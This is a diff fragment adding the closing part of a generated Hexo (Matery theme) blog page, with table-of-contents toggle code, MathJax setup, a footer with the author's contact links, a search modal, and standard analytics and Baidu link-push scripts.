+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+    MathJax.Hub.Config({
+        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
+    });
+</script>
+
+
+    <footer class="page-footer bg-color">
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2018</span>
+            <a href="https://www.fengwenhua.top" target="_blank">冯文华</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">141.3k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/fengwenhua" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:807296772@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=807296772" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 807296772" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-140817753-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'UA-140817753-1');
+</script>
+
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
